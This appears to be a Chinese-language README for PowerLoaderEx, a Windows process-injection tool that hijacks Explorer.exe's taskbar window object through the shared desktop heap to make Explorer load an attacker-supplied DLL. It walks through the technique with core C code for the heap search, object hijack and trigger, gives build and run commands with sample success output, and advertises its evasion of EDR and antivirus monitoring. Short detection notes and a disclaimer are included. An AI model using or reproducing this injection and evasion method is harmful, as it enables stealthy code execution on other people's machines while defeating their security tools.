# PowerLoaderEx - 共享桌面堆代码注入

## 概述

**PowerLoaderEx** 是一种利用 Windows 共享桌面堆（Shared Desktop Heap）进行代码注入的高级技术。它通过劫持 Explorer.exe 的任务栏窗口（Shell_TrayWnd）对象来实现代码执行，完全绕过常规的内存分配和写入 API。

## 技术原理

### 核心思想

Windows 桌面窗口系统使用共享内存（共享桌面堆）来存储窗口数据。所有属于同一桌面的进程都可以访问这个共享堆。PowerLoaderEx 利用这一特性：

1. 通过 `SetWindowLong/SetWindowLongPtr` 写入数据到窗口额外内存
2. 这些数据实际存储在共享桌面堆中
3. 其他进程也能访问相同的共享堆
4. 劫持目标窗口的对象指针
5. 触发消息处理执行恶意代码

### 执行流程

```
[本进程]
  1. 创建窗口（cbWndExtra = 0x200）
     └─> 分配窗口额外内存

  2. 写入魔数（SetWindowLong）
     └─> 0xABABABAB, 0xCDCDCDCD, ...

  3. 查找共享桌面堆
     └─> 遍历内存寻找只读 MEM_MAPPED 区域
     └─> 搜索魔数定位共享堆

[Explorer.exe]
  4. 打开 Explorer 进程
     └─> PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION

  5. 查找 Explorer 共享桌面堆
     └─> 相同大小的只读映射区域

  6. 构建攻击缓冲区
     └─> x64: 直接函数调用链
     └─> x86: ROP 链 + shellcode

  7. 劫持 Shell_TrayWnd
     └─> GetWindowLongPtr(hShellTrayWnd, 0) 获取 CTray 对象
     └─> SetWindowLongPtr(hShellTrayWnd, 0, maliciousObj) 替换对象

  8. 触发执行
     └─> SendNotifyMessage(hShellTrayWnd, WM_PAINT, ...)

  9. 恢复原始对象
     └─> SetWindowLongPtr(hShellTrayWnd, 0, oldCTrayObj)
```

### 关键代码

```c
// 1. 写入魔数到窗口
for (int i = 0; i < NUM_OF_MAGICS; i++) {
    SetWindowLong(myWnd, i * sizeof(ULONG), Magics[i]);
}

// 2. 查找共享桌面堆
while (VirtualQuery(addr, &memInfo, sizeof(memInfo))) {
    if (memInfo.Protect == PAGE_READONLY &&
        memInfo.Type == MEM_MAPPED &&
        memInfo.State == MEM_COMMIT) {

        PBYTE found = SearchMemory(
            (PBYTE)memInfo.BaseAddress,
            memInfo.RegionSize,
            (PBYTE)Magics,
            sizeof(Magics)
        );

        if (found) {
            // 找到共享桌面堆
            sharedHeap = memInfo.BaseAddress;
            break;
        }
    }
    addr += memInfo.RegionSize;
}

// 3. 劫持 Shell_TrayWnd
HWND hShellTrayWnd = FindWindow("Shell_TrayWnd", NULL);
PVOID oldCTrayObj = (PVOID)GetWindowLongPtr(hShellTrayWnd, 0);
SetWindowLongPtr(hShellTrayWnd, 0, (LONG_PTR)maliciousCTrayObj);

// 4. 触发执行
SendNotifyMessage(hShellTrayWnd, WM_PAINT, 0, 0);

// 5. 恢复
SetWindowLongPtr(hShellTrayWnd, 0, (LONG_PTR)oldCTrayObj);
```

## 技术优势

### 1. 绕过检测

- ✅ **无内存分配 API**：不使用 `VirtualAllocEx`
- ✅ **无远程写入 API**：不使用 `WriteProcessMemory`
- ✅ **无线程创建 API**：不使用 `CreateRemoteThread`
- ✅ **合法 API 调用**：仅使用 `SetWindowLong`、`SendNotifyMessage`

### 2. 隐蔽性

- 利用 Windows 合法的窗口消息机制
- 数据存储在共享桌面堆（系统正常机制）
- 不分配新的可执行内存
- 代码执行在目标进程上下文中

### 3. 技术创新

- 首个使用共享桌面堆的注入技术
- 不需要读取目标进程内存
- 跨进程数据传输无需 IPC 机制
- 原始 PowerLoader 的改进版本

## 使用方法

### 编译

```bash
# Windows (MinGW)
build.bat

# 手动编译
gcc -O2 -o powerloader_ex.exe src/powerloader_ex.c -lshlwapi -mwindows
```

### 准备

1. **创建目标 DLL**：
   ```bash
   # 创建一个简单的 DLL (c:\x.dll)
   # 示例：弹出消息框的 DLL
   gcc -shared -o c:\x.dll test_dll.c
   ```

2. **确保 Explorer.exe 运行**：
   - PowerLoaderEx 注入到 Explorer.exe
   - Windows 7 环境测试

### 执行

```cmd
# 直接运行
build\powerloader_ex.exe

# 输出示例：
# ======================================
#   PowerLoaderEx - 共享桌面堆注入
# ======================================
#
# [*] 窗口创建成功：HWND = 0x00050426
#
# [1] 查找共享桌面堆
#     [*] 魔数已写入窗口：0xABABABAB 0xCDCDCDCD 0xABABABAB 0xCDCDCDCD
#     [+] 找到共享桌面堆：0x00180000
#         大小：65536 字节
#         魔数偏移：0x4A20
#
# [2] 查找 Explorer.exe 进程
#     [+] 找到 Explorer.exe，PID: 1234
#
# [3] 查找 Explorer 共享桌面堆
#     [+] 找到 Explorer 共享桌面堆：0x00180000
#
# [4] 构建攻击缓冲区（x64）
#     [+] 攻击缓冲区构建完成
#         LoadLibraryA: 0x7FF8B2C10000
#         目标 DLL: c:\\x.dll
#
# [5] 查找 Shell_TrayWnd 窗口
#     [+] 找到 Shell_TrayWnd：0x00010426
#     [*] 原始 CTray 对象：0x00184A20
#
# [6] 劫持 Shell_TrayWnd 窗口对象
#     [+] CTray 对象已替换为：0x00184A30
#
# [7] 发送 WM_PAINT 消息触发执行
#
# [8] 恢复原始 CTray 对象
#
# [+] PowerLoaderEx 注入成功！
```

## 架构支持

### x64 版本（推荐）

- **实现方式**：直接函数调用链
- **稳定性**：相对稳定
- **复杂度**：较低
- **成功率**：高（Windows 7 测试）

### x86 版本

- **实现方式**：ROP 链 + shellcode
- **稳定性**：依赖 gadget
- **复杂度**：高
- **成功率**：中等（需要查找合适的 gadget）

**注意**：当前实现主要支持 x64，x86 需要完整的 ROP 链实现。

## 防御检测

### EDR/AV 绕过

- **内存分配监控**：❌ 无效（不使用 VirtualAllocEx）
- **内存写入监控**：❌ 无效（不使用 WriteProcessMemory）
- **线程创建监控**：❌ 无效（不创建远程线程）
- **窗口消息监控**：✅ 可能检测到异常窗口消息

### 检测方法

1. **窗口对象监控**：
   - 监控 `SetWindowLongPtr` 修改窗口对象
   - 检测 Shell_TrayWnd 窗口对象的异常修改

2. **共享堆监控**：
   - 扫描共享桌面堆中的异常数据
   - 检测窗口额外内存中的可疑代码

3. **行为分析**：
   - 监控 `SendNotifyMessage` 发送到系统窗口的异常消息
   - 检测 Explorer.exe 加载异常 DLL

## 局限性

1. **系统依赖性**：
   - 仅在 Windows 7 测试
   - 依赖 Windows 内部结构（可能在其他版本失效）
   - 共享桌面堆布局可能变化

2. **目标限制**：
   - 必须注入到 Explorer.exe
   - 需要 Shell_TrayWnd 窗口存在
   - 依赖特定的窗口对象结构

3. **DLL 要求**：
   - 需要预先创建目标 DLL（c:\\x.dll）
   - DLL 路径硬编码（可修改）

## 原始研究

- **研究者**：BreakingMalware.com
- **发布时间**：~2013
- **原始 PowerLoader**：首个使用 ROP 的注入技术（Gapz、Redyms、Carberp 等恶意软件使用）
- **PowerLoaderEx**：移除对 Explorer.exe 共享节区的依赖，更通用化
- **参考实现**：[BreakingMalware/PowerLoaderEx](https://github.com/BreakingMalware/PowerLoaderEx)

## MITRE ATT&CK

- **战术**：Privilege Escalation, Defense Evasion
- **技术**：T1055 (Process Injection)
- **子技术**：T1055.011 (Extra Window Memory Injection)

## 相关技术

- **Atom Bombing**：使用全局 Atom 表进行跨进程数据传输
- **PROPagate**：利用窗口属性进行注入
- **SetWindowsHookEx**：使用窗口钩子注入 DLL

## 测试环境

- **操作系统**：Windows 7 (x86/x64)
- **编译器**：GCC (MinGW-w64)
- **目标进程**：Explorer.exe

## 免责声明

本技术仅供安全研究和教育目的使用。使用者应遵守当地法律法规，不得用于非法用途。作者不对任何滥用行为负责。

## 参考资料

- [PowerLoaderEx GitHub](https://github.com/BreakingMalware/PowerLoaderEx)
- [Extra Window Memory Injection - MITRE](https://attack.mitre.org/techniques/T1055/011/)
- [Windows Desktop Heap](https://docs.microsoft.com/en-us/windows/win32/winmsg/window-features#extra-window-memory)
